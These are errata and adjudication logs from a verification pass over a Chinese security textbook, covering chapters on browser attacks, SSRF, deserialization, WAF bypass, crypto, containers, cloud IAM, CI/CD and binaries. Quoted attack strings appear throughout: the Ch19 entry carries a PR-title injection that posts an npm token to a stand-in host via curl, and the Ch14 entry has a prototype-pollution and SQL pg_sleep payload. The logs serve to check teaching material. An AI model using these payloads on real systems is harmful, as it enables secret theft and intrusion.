arbiter: agrees=true conf=high — 修正 SVG 執行上下文、強化 `resolveSafePath()` 祖先目錄迴圈與 `lstatSync` 檢查，並將自我檢核第 3 題修正為「不含 `..` 且不以 `/` 開頭」。
tiebreak: n/a
action: 修正 9.5 節、防禦對照表、`resolveSafePath()` 實作與自我檢核第 3–4 題解答。

## [2026-11-21] ch09-file-parsers-and-xxe.md — bridging-review
declared_bridge: none
detected_bridges: []
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch10-browser-and-client-attacks.md — fixed
claim: Worked Example 中 CSP 標頭值位元組長度（98 bytes vs 103 bytes）與 2048-bit RS256 JWT 無填充 Base64URL 簽章長度（342 chars vs 344 chars）
book value: CSP 值總長 103 bytes；RS256 簽章段 344 字元、JWT 總長 780 字元、外洩 URL 802 字元  verifier value: `default-src 'self'; script-src 'self' https://cdn.nexuspay-static.example/libs/; object-src 'none'` 共 18 + 2 + 59 + 2 + 17 = 98 bytes；256-byte RSA 簽章經無填充 Base64URL 編碼為 342 字元，搭配 Header 36 + Payload 398 + 2 個句點共 778 字元，外洩 URL 為 22 + 778 = 800 字元  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 實算 ASCII 字元數確為 98 bytes，且 256 bytes 無填充 Base64URL 長度為 ceil(256 * 4 / 3) = 342 字元。
tiebreak: n/a
action: 將 Worked Example 中 CSP 標頭值長度修正為 98 bytes，JWT 長度修正為 36 + 398 + 342 + 2 = 778 字元，外洩 GET URL 長度修正為 800 字元。

## [2026-11-21] ch10-browser-and-client-attacks.md — fixed
claim: CORS 反射 Origin / 信任 null 與同站子網域請求的 Cookie 附送前提、以及 CSPT2CSRF 對 CSRF Token 的繞過範圍
book value: 斷言反射 Origin + Allow-Credentials 即讓任何網站帶著 Cookie 讀回應；稱同 eTLD+1 子網域請求一律附帶 SameSite=Strict Cookie；稱 CSPT2CSRF 完全繞過 CSRF Token  verifier value: CORS 回應標頭僅開放讀取，Cookie 是否附送仍取決於憑證模式與 SameSite/Domain/Secure 條件；同站判定在現代規範下還須同協定（schemeful Same-Site）且 Cookie 作用域涵蓋目標主機；CSPT2CSRF 會自動帶上同源前端共用客戶端自動附掛的全域 CSRF Token 標頭，但若目標端點獨立驗證綁定特定動作的 Token 則仍須通過該驗證  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 補齊 Cookie 附送條件、schemeful Same-Site 與全域 vs 動作綁定 CSRF Token 的成立邊界。
tiebreak: n/a
action: 修正第 1、2、5 節正文與自我檢核第 2 題解答。

## [2026-11-21] ch10-browser-and-client-attacks.md — fixed
claim: Trusted Types 匯點型別區分（TrustedHTML vs TrustedScript vs TrustedScriptURL）與 Sec-Fetch-* Resource Isolation 規則
book value: 稱 `innerHTML`、`document.write` 與 `eval` 皆轉型為 `TrustedHTML`；稱僅拒絕 `Sec-Fetch-Site === "cross-site"` 且 `Sec-Fetch-Mode !== "navigate"` 的請求即可保護狀態變更  verifier value: `innerHTML`/`document.write` 要求 `TrustedHTML`、`script.src` 要求 `TrustedScriptURL`、`eval` 要求 `TrustedScript`；跨站表單 POST 本身即為 `Sec-Fetch-Mode: navigate`（且 iframe 導航亦為 `navigate`），故狀態變更端點必須拒絕所有 `cross-site` 請求，僅對安全方法（GET/HEAD）且 `Sec-Fetch-Mode === "navigate"`、`Sec-Fetch-Dest === "document"` 的頂層導航放行頁面路由  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 修正 Trusted Types 三種可信型別對應關係與 Fetch Metadata 的狀態變更攔截條件。
tiebreak: n/a
action: 修正「故障模式與防禦」第 1 節與第 2 節（同時補齊 16 bytes Base64 Nonce = 24 字元的說明）。

## [2026-11-21] ch10-browser-and-client-attacks.md — fixed
claim: `encodeURIComponent()` 對點號（`.`）的編碼行為、CSPT `../` 目錄回退層數與自我檢核第 3、5 題推導
book value: 稱 `encodeURIComponent()` 會編碼點號 `.`；自我檢核第 5 題稱一個 `../` 在 `/api/v1/reports/${reportId}/summary` 中向上退兩層目錄且未交代 `URLSearchParams.get()` 解碼 `%23`；第 3 題第一個初始 URL `https://static.nexuspay.example/redirect` 在重導前即不符 `/v1/lib.js` 路徑  verifier value: `encodeURIComponent()` 會編碼 `/`、`?`、`#` 但**保留 `.` 不編碼**（單獨傳入 `..` 仍會造成路徑歸約），故必須搭配完整 UUID 格式白名單並拒絕 `.`/`..`；一個 `../` 僅向上移除 `reports` 一層目錄，且須經 `URLSearchParams.get()` 先將 `%2F`、`%23` 解碼為 `/`、`#` 才會截斷 `/summary`；第 3 題兩個初始請求統一由同源 `/redirect?to=...` 發起以精確對照重導向後的 host 檢查與路徑放寬  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — `encodeURIComponent("..") === ".."` 為 JavaScript 標準行為，且 `/api/v1/reports/../users/me/tokens` 僅回退 `reports` 一層。
tiebreak: n/a
action: 修正「故障模式與防禦」第 3 節、自我檢核第 3 題與第 5 題題幹及參考解答。

## [2026-11-21] ch10-browser-and-client-attacks.md — bridging-review
declared_bridge: 瀏覽器 Origin 隔離與容器命名空間隔離的結構邊界對照
detected_bridges: ["瀏覽器 Origin 隔離與容器命名空間隔離的結構邊界對照"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass


<!-- source: verify-log-slice-3.md -->
# P4 Adjudication & Bridging Review Log — Slice 3 (Ch11–Ch15)

## [2026-11-21] ch11-ssrf-parsers-and-cache.md — fixed
claim: Node.js `url.parse()` vs WHATWG `new URL()` parser differentials (`\@` userinfo vs octal/DWORD IPv4 canonicalization), control-character stripping, DNS Rebinding TOCTOU timeline & outbound timeout vs Nginx `proxy_read_timeout`, Web Cache Poisoning `Vary` headers & Cache Buster prerequisites, Web Cache Deception 3 path confusion categories & `%2f` dot-segment normalization, `net.BlockList` CIDR validation, and Nginx dynamic route cache disabling.
book value: stated `url.parse()` treats `127.0.0.1:8080\` as userinfo; listed "4" path confusion categories for 3 items; used string prefix matching `startsWith('fe80')` for IPv6 CIDR; left `proxy_cache` enabled on `location /` in patched Nginx config; missing `### 攻擊者目標與實質影響` H3 heading under `## 機制與推導`.  verifier value: Node.js `url.parse()` normalizes `\` before splitting authority (whereas strict RFC 3986 parsers like `urllib.parse.urlsplit` treat `127.0.0.1:8080\` as userinfo, and `url.parse()` leaves octal `0177.0.0.1` / DWORD `2130706433` unnormalized while WHATWG `new URL()` canonicalizes them to `127.0.0.1`); 3 path confusion categories; binary CIDR matching via `net.BlockList`; explicit `proxy_no_cache 1; proxy_cache_bypass 1;` on dynamic `location /`.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Empirically verified in Node.js 22 that `url.parse()` normalizes `\` to `/` but leaves `0177.0.0.1` and `2130706433` unnormalized, while `new URL()` canonicalizes them to `127.0.0.1` and strict RFC 3986 parsers (`urllib.parse.urlsplit`) parse `127.0.0.1:8080\` as userinfo; confirmed `net.BlockList` handles IPv4/IPv6 CIDR and IPv4-mapped IPv6 accurately.
tiebreak: n/a
action: Added mandatory `### 攻擊者目標與實質影響` H3 under `## 機制與推導`; distinguished RFC 3986 vs WHATWG `\@` splitting and Node.js `url.parse()` vs `new URL()` octal/DWORD IPv4 canonicalization across prose, worked example, Lab 1A, and Self-Check Q1/A1; refined DNS Rebinding timeline, outbound connect timeout vs `proxy_read_timeout = 30 s`, `Vary` header correspondence, 3-item Deception count and `%2f` dot-segment description; replaced prefix checks with `net.BlockList` CIDR validation; disabled shared caching on `location /` in patched Nginx snippet.

### Bridging Review — ch11-ssrf-parsers-and-cache.md
- `declared_bridge`: `CDN/Nginx 快取鍵設計 → Web Cache Poisoning 的 Unkeyed Input`（快取機制 2/3，前段）
- `detected_bridges`: `CDN/Nginx 快取鍵設計 → Web Cache Poisoning 的 Unkeyed Input`（明確標示橋接來源與目標、成立邊界、失效邊界）
- `isomorphism_score`: 5
- `conversational_phrases`: []
- `verdict`: `pass`

---

## [2026-11-21] ch12-race-conditions-and-logic.md — fixed
claim: HTTP/2 frame composition (`HEADERS` + optional `DATA`), Single-Packet `< 1 ms` arrival jitter vs Node.js async `await` interleaving, PostgreSQL `READ COMMITTED` vs `REPEATABLE READ` snapshot creation timing & write skew protection (`SERIALIZABLE` vs `SELECT ... FOR UPDATE`), external bank payout idempotency & Fencing Token scope, and withdrawal contract requirements.
book value: stated every HTTP request consists of `HEADERS` and `DATA` frames; stated all 19 remaining requests deterministically execute `SELECT` before `UPDATE` and receive `40001` under `REPEATABLE READ`; stated `SELECT ... FOR UPDATE` on a parent row alone prevents write skew under `REPEATABLE READ`.  verifier value: `DATA` frames are only present for requests with a body; snapshot under `REPEATABLE READ` is taken at the first non-transaction-control statement, and locking a parent row without updating it does not refresh an already-taken `REPEATABLE READ` snapshot (requires `SERIALIZABLE`, `READ COMMITTED` locking before read, or actual parent-row version update).  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Under PostgreSQL MVCC, `REPEATABLE READ` freezes the snapshot at the first query; `SELECT ... FOR UPDATE` on a parent row without modifying it does not refresh the transaction's snapshot for subsequent child-row reads.
tiebreak: n/a
action: Qualified HTTP/2 `HEADERS` + `DATA` frame statement for requests with bodies; refined `< 1 ms` arrival burst and Node.js async `await` query interleaving; clarified PostgreSQL `REPEATABLE READ` first-statement snapshot semantics and write-skew prevention options in both prose and Self-Check A2; specified external payout idempotency and parameter-bound idempotency key requirements.

### Bridging Review — ch12-race-conditions-and-logic.md
- `declared_bridge`: `資料庫 Isolation Level 與樂觀鎖 → TOCTOU 與單封包雙花攻擊`（DB 交易/不變量 3/3，前段）
- `detected_bridges`: `資料庫 Isolation Level 與樂觀鎖 → TOCTOU 與單封包雙花攻擊`（明確標示成立邊界與失效邊界）
- `isomorphism_score`: 5
- `conversational_phrases`: []
- `verdict`: `pass`

---

## [2026-11-21] ch13-deserialization-and-nodejs-runtime.md — fixed
claim: Prototype pollution property lookup scope (`isAdmin` vs `role`), `child_process.spawn` non-Node binary RCE gadget (`shell` + `BASH_ENV` or `shell: "node"` + `NODE_OPTIONS`), Java `ObjectInputStream` (`readObject`) & Python `pickle` (`__reduce__`) deserialization hooks, ReDoS `keepAliveTimeout = 5 s` vs `proxy_read_timeout = 30 s` impact analysis, UTF-8 byte length check (`Buffer.byteLength`), and `safeDeepMerge` null-handling bug (`typeof null === "object"`).
book value: conflated `Object.prototype.role = "admin"` with reading `user.isAdmin`; stated `shell = "/bin/sh"` alone turns `spawn("git", ["--version"])` environment variables into command execution; stated Java `ObjectInputStream` invokes standard constructors during deserialization; checked `input.length <= 128` for a 128-byte limit; did not check `target[key] === null` before recursing in `safeDeepMerge`.  verifier value: property lookup matches by key name; non-Node `spawn` gadget requires an interpreter-evaluated env var like `BASH_ENV` with `/bin/bash` or `shell = "node"` with `NODE_OPTIONS`; Java uses `readObject()`/`readResolve()` hooks while `pickle` executes the reconstruction callable described by `__reduce__`; UTF-8 byte limit requires `Buffer.byteLength(input, 'utf8') <= 128`; `safeDeepMerge` must guard against `target[key] === null` and `Array.isArray(target[key])`.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — `typeof null === "object"` in JS causes `safeDeepMerge` to pass `null` into the recursive call if `target[key]` was initialized to `null`; `Buffer.byteLength` is required for byte-level bounding on UTF-8 strings.
tiebreak: n/a
action: Fixed property lookup correspondence (`isAdmin` vs `role`); clarified non-Node `spawn` gadget pairs (`shell: "/bin/bash"` + `BASH_ENV` or `shell: "node"` + `NODE_OPTIONS`); corrected Java `ObjectInputStream` and Python `pickle` deserialization hook descriptions; clarified `keepAliveTimeout = 5 s` vs sequential queueing past Nginx `proxy_read_timeout = 30 s` in the ReDoS worked example; added `Buffer.byteLength` check and fixed `target[key] === null || Array.isArray(target[key])` in `safeDeepMerge`.

### Bridging Review — ch13-deserialization-and-nodejs-runtime.md
- `declared_bridge`: `none`（中段，直接以 JS Prototype 鏈與書內 Ch08 匯點模型推導）
- `detected_bridges`: []
- `isomorphism_score`: 5
- `conversational_phrases`: []
- `verdict`: `pass`

---

## [2026-11-21] ch14-waf-and-defense-bypass.md — fixed
claim: Worked Example JSON padding byte count (`len(payload_tail) = 64 bytes`, total `8,273 bytes`, 17-byte safety margin), `ProcessPartial` unclosed JSON assumption, HPP table API specificity & Self-Check Q2/A2 logic, `body-parser.json()` charset behavior (`415` on `ibm037`), `trust proxy = true` leftmost XFF selection, route-aligned rate-limit key normalization, and Lab verification/patch completeness (`verify_ch14.py` & `gateway.ts`).
book value: counted `len(payload_tail)` as `65 bytes` (`Total Content-Length = 8,274 bytes`, margin `16 bytes`); stated standard `body-parser` JSON middleware silently decodes `charset=ibm037`; stated `trust proxy = true` picks "最左側未受信任的位址"; combined XFF and path-case mutation in the same loop in `verify_ch14.py`; omitted UTF-8 check, query-preserving path normalization, and `/v1/auth/otp/verify` merchant rate limiter in `gateway.ts`.  verifier value: `len(',"__proto__":{"isAdmin":true},"sort":"id; SELECT pg_sleep(5)--"}') = 64 bytes`, total `8 + 8200 + 1 + 64 = 8,273 bytes`, margin `8200 - 8183 = 17 bytes`; `body-parser.json()` rejects `ibm037` with `415`; `trust proxy = true` trusts the entire chain and selects the leftmost XFF address; separate XFF and path-case tests in `verify_ch14.py` and complete `gateway.ts`.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Direct byte count of `payload_tail` is `1 + 11 + 1 + 16 + 1 + 6 + 1 + 26 + 1 = 64 bytes`, making total length `8,273 bytes` and uninspected tail `81 bytes`.
tiebreak: n/a
action: Corrected `len(payload_tail) = 64 bytes`, `Total Content-Length = 8,273 bytes`, offset `8,209..8,272`, and 17-byte safety margin in Worked Example; clarified `ProcessPartial` signature-scanning assumption and downstream sink condition; refined HPP table and Self-Check Q2/A2; clarified `body-parser.json()` UTF enforcement vs permissive decoders; fixed `trust proxy = true` wording; updated `verify_ch14.py` to test baseline, XFF rotation, and path-case bypass independently; completed `gateway.ts` with UTF-8 check, query-safe pathname normalization, and `merchant_id` OTP rate limiting.

### Bridging Review — ch14-waf-and-defense-bypass.md
- `declared_bridge`: `none`（中段，承接 Ch03 解析分歧與 Ch11 快取層剖析 WAF/代理對抗）
- `detected_bridges`: []
- `isomorphism_score`: 5
- `conversational_phrases`: []
- `verdict`: `pass`

---

## [2026-11-21] ch15-applied-crypto-flaws.md — fixed
claim: PKCS#7 padding byte notation (`0x01`–`0x10`), AES-CBC Padding Oracle expected query count (`128.5` per byte / `2,056` exact vs `2,048` approximation, plus confirmation query) and byte-15 `0x02 0x02` disambiguation condition (`P'_i[14] = I_i[14] ^ C'_{i-1}[14] == 0x02`), AES-GCM CTR block counter indexing (`inc_32^j(J_0)`), Forbidden Attack conditions for recovering `H` and forging tags, `Math.random()` Z3 state recovery preconditions, KDF vs password stretching distinction (Argon2id/scrypt vs HKDF), and AEAD AAD unsealing + Double-HMAC verification in code.
book value: wrote `C_j = P_j ⊕ E_K(inc_32(J_0))` without block index `j`; attributed byte-15 `0x02 0x02` ambiguity to original plaintext ending in `0x02 0x02` even when `C'_{i-1}[14]` was zeroed; conflated low-entropy password stretching (Argon2id/scrypt) with HKDF domain separation; omitted `unsealSessionCookie` showing trusted AAD reconstruction and version policy enforcement.  verifier value: block `j` uses `inc_32^j(J_0)`; `0x02 0x02` ambiguity occurs when `P'_i[14] = I_i[14] ^ C'_{i-1}[14] == 0x02` so candidate `g_2 = I_i[15] ^ 0x02` forms valid 2-byte padding; exact uniform expectation is `128.5` trials/byte (`2,056`/block, `6,168`/3 blocks, approximated as `2,048` and `6,144`); Argon2id/scrypt stretch low-entropy passwords while HKDF derives domain-separated subkeys from high-entropy keys.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — All algebraic and cryptographic refinements verified closed-book and consistent with `_meta/running-examples.md`.
tiebreak: n/a
action: Fixed CTR formula to `C_j = P_j ⊕ E_K(inc_32^j(J_0))`; clarified PKCS#7 notation (`0x01`–`0x10`), exact discrete expectation (`128.5`/byte = `2,056`/block alongside `2,048` approximation), and `P'_i[14] == 0x02` disambiguation algebra; refined Forbidden Attack conditions and NIST SP 800-38D `2^32` random-nonce collision bound (`≈ 2^{-33} < 2^{-32}`); separated Argon2id/scrypt password stretching from HKDF domain separation; added `unsealSessionCookie` with trusted `expectedTenantId` AAD reconstruction and `minAcceptedVersion` check.

### Bridging Review — ch15-applied-crypto-flaws.md
- `declared_bridge`: `none`（中段，直接以協定狀態機與位元組區塊推導密碼學實作破口）
- `detected_bridges`: []
- `isomorphism_score`: 5
- `conversational_phrases`: []
- `verdict`: `pass`


<!-- source: verify-log-slice-4.md -->
# P4 Adjudication & Bridging Review Log — Slice 4 (Ch16–Ch20)

## [2026-11-21] ch16-ai-and-agent-security.md — fixed
claim: 本章對齊 OWASP Top 10 for Large Language Model Applications（2025），涵蓋 LLM01 Prompt Injection、LLM02 Sensitive Information Disclosure 與 LLM06 Excessive Agency。
book value: OWASP Top 10 for Large Language Model Applications（2025）含 LLM01、LLM02、LLM06  verifier value: source-evidence 僅確認 LLM01 與 LLM06，無 2025 年份與 LLM02 編號佐證  flagging families: google (agy:gemini-4-argon-low)
arbiter: agrees=true conf=high — 延伸閱讀條目加上未在 source-evidence 明列的（2025）與 LLM02 編號，改為直接對齊 LLM01 Prompt Injection、敏感資訊外洩與 LLM06 Excessive Agency。
tiebreak: n/a
action: 移除延伸閱讀中未佐證的（2025）年份與 LLM02 編號標示，對齊 source-evidence。

## [2026-11-21] ch16-ai-and-agent-security.md — dismissed
claim: 動手做章節列出 PortSwigger Web Security Academy 的『Web LLM attacks』主題下 4 個實戰關卡名稱與難度級別。
book value: 列出 4 個 PortSwigger Web LLM attacks 實戰關卡與思維提示  verifier value: source-evidence 未逐一列出關卡名稱（imprecise）  flagging families: google (agy:gemini-4-argon-low)
arbiter: agrees=false conf=high — 此為 style-guide 與 outline 明確要求之外部靶場檢查點（Pitfall #12 闭卷面板對未錄入 source-evidence 之外部靶場清單標為 imprecise），屬正常教學引導且無事實錯誤。
tiebreak: anthropic/book_correct
action: dismissed-with-concurrence

## [2026-11-21] ch16-ai-and-agent-security.md — bridging-review: pass
declared_bridge: none
detected_bridges: []
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch17-containers-and-kubernetes.md — fixed
claim: 容器隔離四機制、橋接成立邊界、cgroups v1 release_agent 觸發條件、CAP_SYS_ADMIN / CAP_DAC_READ_SEARCH / CAP_BPF / seccomp RuntimeDefault / hostPID 條件、RBAC secrets/get 與 bind 生效範圍、5×4 權限圖最短 3 步提權前提（SelfSubjectRulesReview POST 與節點憑證分佈）、PSS Restricted 允許 Localhost seccomp、capabilities.drop 與無特權系統呼叫描述、restricted 下透過 pods/create 竊取同 Namespace Secret 之傳回條件，以及撤銷 SA Token 自動掛載需重建既有 Pod。
book value: 原文部分條件敘述省略了網路政策／命名空間前提、notify_on_release=1、POST selfsubjectrulesreviews、Localhost seccomp 及 pods/log 授權差異  verifier value: 補足各項核心機制、RBAC 動詞邊界、5×4 提權圖節點前提與 PSS Restricted 規範細節  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 逐項核對 Linux namespaces/cgroups/capabilities/seccomp 與 Kubernetes RBAC/PSA 規範，補齊所有必要成立前提並修正 HTTP 方法（POST selfsubjectrulesreviews）與 Localhost seccomp 描述。
tiebreak: n/a
action: 全面修訂 Ch17 橋接成立邊界、Linux 四大隔離原語條件、RBAC 提權原語、5×4 Worked Example 前提與 API 方法、PSS Restricted 規範描述及自我檢核解答。

## [2026-11-21] ch17-containers-and-kubernetes.md — bridging-review: pass
declared_bridge: Linux 行程模型與容器 `chroot`/Namespace → 核心隔離逃逸邊界
detected_bridges: ["Linux 行程模型與容器 chroot/Namespace → 核心隔離逃逸邊界（錨點、成立邊界、失效邊界完整）"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch18-cloud-iam-and-lateral-movement.md — fixed
claim: SSRF/工作負載失守取證前提、憑證匯出外部使用之網路條件限制、IMDSv1 單次/兩次 GET 與 IMDSv2 Hop Limit=2 影響範圍、IAM 策略交集閘門與同帳號 Resource Policy / KMS Key Policy 委派規則、Confused Deputy ExternalId 與 UpdateAssumeRolePolicy / UpdateFunctionCode 前提、S3 Block Public Access 四子項機制與 SigV4 X-Amz-Expires 參數名、CloudTrail 無獨立 iam:PassRole 事件、Permissions Boundary 需包含部署動作與顯式拒絕生產資源、LocalStack 與 mock_imds.py 模擬範圍說明。
book value: 原文將 iam:PassRole 列為 CloudTrail 獨立事件、Permissions Boundary 範例未納入 lambda:CreateFunction/PassRole Allow 與生產資源 Explicit Deny、SigV4 參數寫為 Expires  verifier value: 修正 CloudTrail 事件描述、補齊 Permissions Boundary JSON 的部署 Allow 與生產資源 Explicit Deny、改用 X-Amz-Expires 並精確化 IAM 評估與實驗說明  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 獨立重算 IAM 策略交集：若 Permissions Boundary 未包含 lambda:CreateFunction 與 iam:PassRole，部署角色在交集下會連正常部署都被拒絕；且 iam:PassRole 是授權檢查而非獨立 CloudTrail 事件，必須修正。
tiebreak: n/a
action: 修訂 Ch18 IMDSv1/v2 條件、IAM 評估交集與 KMS 規則、S3 Block Public Access 與 X-Amz-Expires、移除 CloudTrail 獨立 iam:PassRole 範例、補齊 Permissions Boundary JSON 並精確標註 LocalStack 與 mock_imds 實驗模擬範圍。

## [2026-11-21] ch18-cloud-iam-and-lateral-movement.md — bridging-review: pass
declared_bridge: none
detected_bridges: []
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch19-supply-chain-and-cicd.md — fixed
claim: CI/CD DAG 橋接成立邊界（可重現與 Provenance 可稽核性）、Dependency Confusion 版本範圍條件（99.0.0 vs ^1.4.2 內之 1.99.0）、package-lock.json resolved/integrity 條件、cargo check / rust-analyzer 執行條件、pull_request vs pull_request_target 預設秘密與權限表、45 字元 PR 標題展開後位元組數（10 + 45 + 1 = 56 bytes，原誤寫 60 bytes）、OIDC JWT 簽章（JWS 明文宣告而非加密宣告）與 AWS IAM sub/job_workflow_ref 比對方式、SLSA L3 控制平面隔離、Sigstore/Cosign 簽章驗證與 workflow 範例補上 cosign sign 步驟、Lab 任務一標題與描述對齊。
book value: Worked Example 展開結果寫為 60 bytes、OIDC JWT 寫為「加密身分宣告」、Cosign workflow 僅列 installer 未列 cosign sign 命令  verifier value: `echo "PR: ` (10B) + payload (45B) + `"` (1B) = 56 bytes；OIDC JWT 為數位簽章（JWS）而非加密；補齊 cosign sign 步驟與各項條件  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 驗算 `echo "PR: x"; curl -s -d "$NPM_TOKEN" https://x.io/c; #"` 長度確為 10 + 45 + 1 = 56 bytes；JWT 為 JWS 簽章；AWS IAM OIDC 預設條件鍵為 sub 與 aud，若比對 workflow 應透過自訂 sub 範本納入。
tiebreak: n/a
action: 修正 Ch19 Worked Example 56 bytes 長度算式、修正 OIDC JWS 簽章與自訂 sub 說明、補上 workflow 範例之 cosign sign 步驟，並收緊 Dependency Confusion、Lockfile、SLSA L3 與 Lab 描述。

## [2026-11-21] ch19-supply-chain-and-cicd.md — bridging-review: pass
declared_bridge: CI/CD 建置管線 DAG → 供應鏈信任傳遞與投毒點
detected_bridges: ["CI/CD 建置管線 DAG → 供應鏈信任傳遞與投毒點（錨點、成立邊界、失效邊界完整）"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch20-binary-and-memory-layout.md — fixed
claim: 頁表橋接成立與失效邊界（堆疊與 .got.plt 分屬不同映射）、ELF PT_DYNAMIC 與 DT_SYMTAB/DT_STRTAB、Canonical Address LA57 bit 56 符號擴展與 #GP/#SS 例外、Callee-saved 保存原則與堆疊調整對齊、ARM64 使用者態 EL0 堆疊對齊控制位元 SCTLR_EL1.SA0（原誤寫 SA）、28-bit ASLR 無重複線性猜測期望值 (N+1)/2 = 134,217,728.5 次與崩潰次數模型區分、低 12 bits 固定僅適用於頁對齊映像符號（stack 局部變數有次頁級偏移）、Stack Canary 返回前偵測與 off-by-one 洩漏條件、Partial/Full RELRO 驗證旗標、nexus_parse.c 處理 len=0 時初始化 local_copy 避免未初始化讀取。
book value: ARM64 EL0 堆疊對齊寫為 SCTLR_EL1.SA、線性猜測期望值寫為 N/2、nexus_parse.c 在 len=0 時讀取未初始化的 local_copy[0]  verifier value: EL0 由 SCTLR_EL1.SA0 控制（SA 為 EL1）、含命中當次之無重複期望為 (N+1)/2 = 134,217,728.5 次、nexus_parse.c 應初始化 local_copy 並處理 preview == 0  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — ARMv8-A 規範中 SCTLR_EL1.SA0 控制 EL0 SP 對齊檢查；離散均勻分布 {1..N} 期望值為 (N+1)/2 = 134,217,728.5；且 C 基準程式在 len=0 時確實會讀取未初始化之 local_copy[0]，應初始化為 0 並加上 preview > 0 判斷。
tiebreak: n/a
action: 修正 Ch20 SCTLR_EL1.SA0、LA57 bit 56、ASLR 期望值 (N+1)/2、區分映射符號與 stack 之低 12 bits 行為、修正 nexus_parse.c 零長度負載處理，以及精確化 ELF/RELRO/Canary 描述。

## [2026-11-21] ch20-binary-and-memory-layout.md — bridging-review: pass
declared_bridge: 作業系統虛擬記憶體頁表 → ELF 與 64 位元行程位址空間
detected_bridges: ["作業系統虛擬記憶體頁表 → ELF 與 64 位元行程位址空間（錨點、成立邊界、失效邊界完整）"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass


<!-- source: verify-log-slice-5.md -->
# P4 Adjudication & Bridging Review Log — slice-5

- **Agent**: `p4-adj-5` (`gemini-4-argon-medium`)
- **Date**: `2026-11-21`
- **Assigned Chapters**:
  - `ch21-reverse-engineering.md`
  - `ch25-rust-unsafe-and-ffi.md`
  - `ch28-static-and-variant-analysis.md`
  - `ch29-fuzzing-engineering.md`
  - `ch30-symbolic-execution-and-hybrid-fuzzing.md`

---

## [2026-11-21] ch21-reverse-engineering.md — fixed

- **claim**: 「第 05 行將第一個參數 `rdi` 備份至 callee-saved 暫存器 `rbx`，代表整個函式後續皆以 `rdi` 或 `rbx` 作為同一個結構體指標的基底位址。」
  - **book value**: `rdi` 與 `rbx` 全程皆為原結構體指標
  - **verifier value**: 前段以 `rdi` 讀取原物件，第 16 行 `mov edi, eax` 覆寫 `rdi` 傳遞 `malloc` 大小，呼叫後改由 `rbx` 存取原基底
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 第 16 行寫入 `edi` 會將 `rdi` 改為 `malloc` 參數並清零高 32 位元，故呼叫後僅 `rbx` 保存原基底位址。
  - **tiebreak**: `n/a`
  - **action**: 修正第 173 行，明確區分呼叫前使用 `rdi`、第 16 行覆寫 `edi`、呼叫後由 `rbx` 存取結構體基底。

- **claim**: 「函式並未在移位前將數值擴充為 64 位元（例如 `movsxd`/`mov eax` 後在 `rdi` 上做 `shl rdi, 3`）。」
  - **book value**: 括號示例混入有號擴充 `movsxd` 且未交代暫存器搬移至 `rdi`
  - **verifier value**: 對無號 `uint32_t` 欄位應做數值保持的零擴充（如 `mov edi, dword ptr [rdi+0x4]` 零擴充至 `rdi` 後再做 `shl rdi, 3`）
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — `count` 為 `uint32_t`，使用 `movsxd` 會將 bit 31 符號擴充而破壞無號數值。
  - **tiebreak**: `n/a`
  - **action**: 修正第 191 行，改為 `mov edi, dword ptr [rdi+0x4]` 零擴充至 `rdi` 後執行 `shl rdi, 3`，同時釐清 `65,536 / 8 = 8,192` 的固定 `8-byte` 項目數換算前提、候選結構佈局與局部擬碼描述。

- **claim**: 「在 glibc `ptmalloc2` 中，`malloc(0)` 不會回傳 `NULL`，而是配置一個最小可用 chunk（總計 `0x20 = 32 bytes`，扣掉 `8-byte` chunk header 後僅剩 `24 bytes` 可用寫入空間）。」
  - **book value**: 無條件斷言不回傳 `NULL` 且將配置器內部尺寸當成呼叫端可寫空間
  - **verifier value**: 配置成功時回傳最小 `32-byte` chunk，且零長度請求在語言契約上不應寫入資料
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 補上「當配置成功時」前提，並區分 `0x20 = 32 bytes` 實體 chunk 大小與語言契約上的零長度不可寫入要求。
  - **tiebreak**: `n/a`
  - **action**: 修正第 194–195 行，明確標註配置成功前提、語言契約零長度不可寫入，以及後續寫入迴圈屬未包含於 18 行配置片段的填充邏輯。

- **claim**: 「旗標 P-code 如果沒有被後續任何條件跳躍（`CBRANCH`）讀取，整條旗標計算會被直接刪去。」
  - **book value**: 僅檢查 `CBRANCH`
  - **verifier value**: 旗標亦可供 `CMOVcc`、`SETcc`、`ADC`/`SBB` 等指令讀取，須在後續資料流無任何可觀察用途時才可刪除
  - **flagging families**: `codex:gpt-6.2-sol:low`
  - **arbiter**: `agrees=true conf=high` — 死碼消除依據 Def-Use 鏈上無任何讀取者，而非僅限條件跳躍。
  - **tiebreak**: `n/a`
  - **action**: 修正第 81–94 行，補齊 Raw P-code 兩次 32 位元寫入的高位清零與旗標步驟、`INDIRECT` 節點定義，以及死碼消除涵蓋 `CBRANCH`/`CMOVcc`/`SETcc`/`ADC`/`SBB` 等所有讀取。

- **claim**: 「所有標準庫與第三方共用函式庫的呼叫都必須經過 `.plt`」以及「透過 XREF 即可直接反查所有呼叫點」。
  - **book value**: 絕對化「所有呼叫都必須經過 `.plt`」
